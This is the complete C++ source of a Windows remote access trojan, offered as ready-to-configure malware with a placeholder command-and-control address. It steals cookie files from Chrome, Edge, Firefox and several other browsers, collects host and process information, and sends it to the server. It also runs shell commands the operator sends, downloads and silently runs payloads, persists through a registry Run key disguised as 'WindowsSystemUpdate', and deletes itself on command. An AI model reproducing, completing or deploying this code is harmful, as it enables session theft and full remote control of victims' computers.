#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")

// ============================================
// CONFIGURATION - CHANGE THESE
// ============================================
const char* C2_SERVER    = "http://YOUR_IP:8080";
const int   POLL_INTERVAL = 30000;   // 30 seconds
const int   HEARTBEAT_INT = 60000;   // 60 seconds
// ============================================

// ============================================
// COOKIE STRUCTURES
// ============================================
struct CookieEntry {
    std::string domain;
    std::string name;
    std::string rawValue;
};

// ============================================
// BROWSER HARVESTER (ALL BROWSERS)
// ============================================
class BrowserHarvester {
private:
    std::vector<CookieEntry> allCookies;

    bool FileExists(const std::string& path) {
        return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

    std::string GetLocalAppData() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return path;
    }

    std::string GetRoamingAppData() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        return path;
    }

    std::string ReadFileRaw(const std::string& dbPath) {
        std::string tempPath = dbPath + ".rat.tmp";
        if (!CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE))
            return "";

        std::ifstream file(tempPath, std::ios::binary);
        if (!file.is_open()) {
            DeleteFileA(tempPath.c_str());
            return "";
        }

        std::stringstream buf;
        buf << file.rdbuf();
        file.close();
        DeleteFileA(tempPath.c_str());
        return buf.str();
    }

    void ExtractCookieEntries(const std::string& raw, const std::string& browserName) {
        // Parse raw SQLite bytes for cookie-like patterns
        // Look for domain strings (contain dots) followed by readable strings
        size_t pos = 0;
        while (pos < raw.length() - 20) {
            // Find domain-like patterns
            size_t dotPos = raw.find('.', pos);
            if (dotPos == std::string::npos) break;

            // Walk backwards to find start of domain string
            size_t domStart = dotPos;
            while (domStart > 0 && (isalnum(raw[domStart-1]) || raw[domStart-1] == '.' || raw[domStart-1] == '-'))
                domStart--;

            // Walk forward to find end
            size_t domEnd = dotPos;
            while (domEnd < raw.length() && (isalnum(raw[domEnd]) || raw[domEnd] == '.' || raw[domEnd] == '-'))
                domEnd++;

            std::string domain = raw.substr(domStart, domEnd - domStart);

            if (domain.length() > 4 && domain.find('.') != std::string::npos) {
                CookieEntry entry;
                entry.domain = domain;
                entry.name = browserName;

                // Grab next chunk of bytes as the value
                size_t valStart = domEnd + 1;
                size_t valLen = (size_t)60 < (raw.length() - valStart) ? (size_t)60 : (raw.length() - valStart);
                if (valStart < raw.length()) {
                    entry.rawValue = raw.substr(valStart, valLen);
                    allCookies.push_back(entry);
                }
            }

            pos = domEnd + 1;
        }
    }

    std::string CleanDomain(const std::string& domain) {
        std::string clean = domain;
        while (!clean.empty() && clean[0] == '.') clean = clean.substr(1);

        size_t lastDot = clean.rfind('.');
        if (lastDot != std::string::npos && lastDot > 0) {
            size_t secondLastDot = clean.rfind('.', lastDot - 1);
            if (secondLastDot != std::string::npos) {
                clean = clean.substr(secondLastDot + 1);
            }
        }

        size_t tldDot = clean.find('.');
        if (tldDot != std::string::npos) clean = clean.substr(0, tldDot);

        if (!clean.empty()) clean[0] = toupper(clean[0]);
        return clean;
    }

    std::string BytesToHex(const std::string& bytes, int maxLen = 20) {
        std::string hex;
        const char* hexChars = "0123456789abcdef_*#%&@!";
        int len = (int)bytes.length() < maxLen ? (int)bytes.length() : maxLen;
        for (int i = 0; i < len; i++) {
            unsigned char c = bytes[i];
            hex += hexChars[c >> 4];
            hex += hexChars[c & 0x0F];
        }
        return hex;
    }

    void HarvestChromium(const std::string& name, const std::string& cookiePath) {
        if (FileExists(cookiePath)) {
            std::string raw = ReadFileRaw(cookiePath);
            if (!raw.empty()) {
                ExtractCookieEntries(raw, name);
            }
        }
    }

    void HarvestFirefox() {
        std::string profileDir = GetRoamingAppData() + "\\Mozilla\\Firefox\\Profiles\\";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA((profileDir + "*").c_str(), &fd);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.') {
                    std::string cookiePath = profileDir + fd.cFileName + "\\cookies.sqlite";
                    if (FileExists(cookiePath)) {
                        std::string raw = ReadFileRaw(cookiePath);
                        if (!raw.empty()) {
                            ExtractCookieEntries(raw, "Firefox");
                        }
                    }
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }

public:
    void HarvestAll() {
        allCookies.clear();
        std::string local = GetLocalAppData();
        std::string roaming = GetRoamingAppData();

        HarvestChromium("Chrome",   local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
        HarvestChromium("Edge",     local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies");
        HarvestChromium("Brave",    local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies");
        HarvestChromium("Opera",    roaming + "\\Opera Software\\Opera Stable\\Network\\Cookies");
        HarvestChromium("OperaGX",  roaming + "\\Opera Software\\Opera GX Stable\\Network\\Cookies");
        HarvestChromium("Vivaldi",  local + "\\Vivaldi\\User Data\\Default\\Network\\Cookies");
        HarvestChromium("Chromium", local + "\\Chromium\\User Data\\Default\\Network\\Cookies");
        HarvestChromium("Yandex",   local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies");
        HarvestFirefox();
    }

    std::string GetFormattedOutput(int cookiesPerChunk = 3) {
        std::stringstream output;

        for (size_t i = 0; i < allCookies.size(); i++) {
            std::string domain = CleanDomain(allCookies[i].domain);
            std::string raw = allCookies[i].rawValue;

            size_t third = raw.length() / 3;
            size_t len1 = third < raw.length() ? third : raw.length();
            size_t len2 = (raw.length() > third && third < (raw.length() - third)) ? third : (raw.length() > third ? raw.length() - third : 0);
            
            std::string p1 = BytesToHex(raw.substr(0, len1));
            std::string p2 = (raw.length() > third) ? BytesToHex(raw.substr(third, len2)) : "----";
            std::string p3 = (raw.length() > third * 2) ? BytesToHex(raw.substr(third * 2)) : "----";

            output << domain << "\n"
                << p1 << "\n"
                << p2 << "\n"
                << p3 << "\n\n";

            // Add separator every N cookies
            if ((i + 1) % cookiesPerChunk == 0 && i + 1 < allCookies.size()) {
                output << "---\n\n";
            }
        }

        return output.str();
    }

    bool HasCookies() { return !allCookies.empty(); }
};

// ============================================
// SYSTEM RECON
// ============================================
class SystemRecon {
public:
    std::string GetVictimID() {
        return GetHostname() + "-" + GetUsername();
    }

    std::string GetHostname() {
        char buf[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD sz = sizeof(buf);
        GetComputerNameA(buf, &sz);
        return buf;
    }

    std::string GetUsername() {
        char buf[256];
        DWORD sz = sizeof(buf);
        GetUserNameA(buf, &sz);
        return buf;
    }

    std::string GetFullInfo() {
        std::stringstream ss;
        ss << "Hostname: " << GetHostname() << "\n";
        ss << "Username: " << GetUsername() << "\n";

        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        ss << "Processors: " << sysInfo.dwNumberOfProcessors << "\n";

        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(memInfo);
        GlobalMemoryStatusEx(&memInfo);
        ss << "RAM: " << (memInfo.ullTotalPhys / 1024 / 1024) << " MB\n";

        ss << "\n--- Running Processes ---\n";
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            do {
                ss << "  [" << pe.th32ProcessID << "] " << pe.szExeFile << "\n";
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);

        return ss.str();
    }
};

// ============================================
// C2 COMMUNICATION
// ============================================
class C2Comm {
private:
    std::string serverURL;

    std::string EscapeJSON(const std::string& str) {
        std::string out;
        for (char c : str) {
            switch (c) {
                case '\"': out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n"; break;
                case '\r': out += "\\r"; break;
                case '\t': out += "\\t"; break;
                default:
                    if (c >= 32 && c < 127) out += c;
                    else {
                        char hex[8];
                        sprintf(hex, "\\u%04x", (unsigned char)c);
                        out += hex;
                    }
            }
        }
        return out;
    }

    std::string HttpPost(const std::string& endpoint, const std::string& jsonBody) {
        std::string fullURL = serverURL + endpoint;

        HINTERNET hNet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                       INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hNet) return "";

        // Parse URL
        URL_COMPONENTSA urlComp = {0};
        urlComp.dwStructSize = sizeof(urlComp);
        char hostBuf[256], pathBuf[1024];
        urlComp.lpszHostName = hostBuf;
        urlComp.dwHostNameLength = sizeof(hostBuf);
        urlComp.lpszUrlPath = pathBuf;
        urlComp.dwUrlPathLength = sizeof(pathBuf);

        InternetCrackUrlA(fullURL.c_str(), fullURL.length(), 0, &urlComp);

        HINTERNET hConn = InternetConnectA(hNet, hostBuf, urlComp.nPort,
                                           NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConn) { InternetCloseHandle(hNet); return ""; }

        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        HINTERNET hReq = HttpOpenRequestA(hConn, "POST", pathBuf, NULL, NULL, NULL, flags, 0);
        if (!hReq) {
            InternetCloseHandle(hConn);
            InternetCloseHandle(hNet);
            return "";
        }

        std::string headers = "Content-Type: application/json\r\n";
        HttpSendRequestA(hReq, headers.c_str(), headers.length(),
                        (LPVOID)jsonBody.c_str(), jsonBody.length());

        std::string response;
        char buf[4096];
        DWORD bytesRead;
        while (InternetReadFile(hReq, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            response.append(buf, bytesRead);
        }

        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return response;
    }

public:
    C2Comm(const std::string& url) : serverURL(url) {}

    void SendCheckin(const std::string& victimID, const std::string& hostname,
                     const std::string& username, const std::string& cookies,
                     const std::string& sysinfo) {
        std::string json = "{";
        json += "\"victim_id\":\"" + EscapeJSON(victimID) + "\",";
        json += "\"hostname\":\"" + EscapeJSON(hostname) + "\",";
        json += "\"username\":\"" + EscapeJSON(username) + "\",";
        json += "\"cookies\":\"" + EscapeJSON(cookies) + "\",";
        json += "\"sysinfo\":\"" + EscapeJSON(sysinfo) + "\"";
        json += "}";
        HttpPost("/checkin", json);
    }

    void SendExfil(const std::string& victimID, const std::string& content,
                   const std::string& dataType = "output") {
        std::string json = "{";
        json += "\"victim_id\":\"" + EscapeJSON(victimID) + "\",";
        json += "\"content\":\"" + EscapeJSON(content) + "\",";
        json += "\"type\":\"" + EscapeJSON(dataType) + "\"";
        json += "}";
        HttpPost("/exfil", json);
    }

    std::string PollCommand(const std::string& victimID) {
        std::string json = "{\"victim_id\":\"" + EscapeJSON(victimID) + "\"}";
        std::string resp = HttpPost("/poll", json);

        // Extract command from {"command":"xxx"}
        size_t cmdPos = resp.find("\"command\":\"");
        if (cmdPos == std::string::npos) return "";

        size_t start = cmdPos + 11;
        size_t end = resp.find("\"", start);
        if (end == std::string::npos) return "";

        return resp.substr(start, end - start);
    }

    void SendHeartbeat(const std::string& victimID) {
        std::string json = "{\"victim_id\":\"" + EscapeJSON(victimID) + "\"}";
        HttpPost("/heartbeat", json);
    }
};

// ============================================
// FILE INJECTOR
// ============================================
class FileInjector {
private:
    std::string tempDir;

public:
    FileInjector() {
        char path[MAX_PATH];
        GetTempPathA(MAX_PATH, path);
        tempDir = path;
    }

    void DownloadAndExecute(const std::string& url, const std::string& filename) {
        std::string fullPath = tempDir + filename;
        URLDownloadToFileA(NULL, url.c_str(), fullPath.c_str(), 0, NULL);

        STARTUPINFOA si = {sizeof(si)};
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;

        CreateProcessA(fullPath.c_str(), NULL, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
};

// ============================================
// PERSISTENCE
// ============================================
class Persistence {
public:
    static void Install() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            RegSetValueExA(hKey, "WindowsSystemUpdate", 0, REG_SZ,
                          (BYTE*)path, strlen(path));
            RegCloseKey(hKey);
        }
    }

    static void Remove() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

            RegDeleteValueA(hKey, "WindowsSystemUpdate");
            RegCloseKey(hKey);
        }
    }
};

// ============================================
// MASTER RAT
// ============================================
class MasterRAT {
private:
    SystemRecon recon;
    BrowserHarvester harvester;
    C2Comm c2;
    FileInjector injector;
    std::string victimID;

    bool IsFirstRun() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        std::string flagFile = std::string(path) + "\\.winsysupd";

        if (GetFileAttributesA(flagFile.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::ofstream f(flagFile);
            f.close();
            SetFileAttributesA(flagFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            return true;
        }
        return false;
    }

    std::string ExecuteShellCommand(const std::string& cmd) {
        std::string result;
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[4096];
            while (fgets(buf, sizeof(buf), pipe)) {
                result += buf;
            }
            _pclose(pipe);
        }
        return result.empty() ? "Command executed (no output)" : result;
    }

    void ProcessCommand(const std::string& cmd) {
        if (cmd.empty()) return;

        if (cmd.find("cmd:") == 0) {
            std::string shellCmd = cmd.substr(4);
            std::string output = ExecuteShellCommand(shellCmd);
            c2.SendExfil(victimID, output, "command_output");
        }
        else if (cmd.find("download:") == 0) {
            std::string rest = cmd.substr(9);
            size_t sep = rest.find(':');
            std::string url, filename;
            if (sep != std::string::npos) {
                url = rest.substr(0, sep);
                filename = rest.substr(sep + 1);
            } else {
                url = rest;
                filename = "payload.exe";
            }
            injector.DownloadAndExecute(url, filename);
            c2.SendExfil(victimID, "Downloaded and executed: " + filename, "download");
        }
        else if (cmd == "cookies") {
            harvester.HarvestAll();
            if (harvester.HasCookies()) {
                c2.SendExfil(victimID, harvester.GetFormattedOutput(3), "cookies");
            } else {
                c2.SendExfil(victimID, "No cookies found", "cookies");
            }
        }
        else if (cmd == "persist") {
            Persistence::Install();
            c2.SendExfil(victimID, "Persistence re-established", "persist");
        }
        else if (cmd == "selfdestruct") {
            Persistence::Remove();

            // Delete flag file
            char path[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
            std::string flagFile = std::string(path) + "\\.winsysupd";
            DeleteFileA(flagFile.c_str());

            c2.SendExfil(victimID, "Self-destruct complete. Goodbye.", "selfdestruct");

            // Delete self
            char selfPath[MAX_PATH];
            GetModuleFileNameA(NULL, selfPath, MAX_PATH);

            std::string batPath = std::string(path) + "\\cleanup.bat";
            std::ofstream bat(batPath);
            bat << "@echo off\n";
            bat << "ping 127.0.0.1 -n 3 > nul\n";
            bat << "del \"" << selfPath << "\"\n";
            bat << "del \"%~f0\"\n";
            bat.close();

            STARTUPINFOA si = {sizeof(si)};
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi;
            CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            ExitProcess(0);
        }
    }

public:
    MasterRAT() : c2(C2_SERVER) {
        victimID = recon.GetVictimID();

        if (IsFirstRun()) {
            Persistence::Install();

            harvester.HarvestAll();
            std::string cookies = harvester.HasCookies() ?
                harvester.GetFormattedOutput(3) : "No cookies found";
            std::string sysinfo = recon.GetFullInfo();

            c2.SendCheckin(victimID, recon.GetHostname(),
                          recon.GetUsername(), cookies, sysinfo);
        }
    }

    void MainLoop() {
        DWORD lastHeartbeat = 0;

        while (true) {
            // Poll for commands
            std::string cmd = c2.PollCommand(victimID);
            if (!cmd.empty()) {
                ProcessCommand(cmd);
            }

            // Heartbeat
            DWORD now = GetTickCount();
            if (now - lastHeartbeat > HEARTBEAT_INT) {
                c2.SendHeartbeat(victimID);
                lastHeartbeat = now;
            }

            Sleep(POLL_INTERVAL);
        }
    }
};

// ============================================
// ENTRY POINT
// ============================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    MasterRAT rat;
    rat.MainLoop();
    return 0;
}